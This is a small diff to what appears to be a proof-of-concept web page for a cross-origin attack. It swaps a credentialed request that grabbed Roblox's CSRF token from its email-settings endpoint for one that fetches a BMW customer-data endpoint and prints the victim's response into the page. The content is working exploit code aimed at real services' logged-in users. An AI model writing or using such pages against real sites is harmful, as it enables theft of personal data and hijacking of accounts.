@@ -34,12 +34,11 @@ Attention!click the button will lead your account disabled.
 		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
 		{
 			document.getElementById("customer").innerHTML = xmlhttp1.responseText;
-			var csrftoken = xmlhttp1.getResponseHeader("x-csrf-token");
-			console.log(csrftoken);
+			console.log("Success");
 		}
 	}
     	
-	xmlhttp1.open("POST","https://accountsettings.roblox.com/v1/email",true);
+	xmlhttp1.open("GET","https://customer.bmwgroup.com/gcdm/protected/bmwdigital/DE-de/customers?getBuPa=true",true);
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
 	
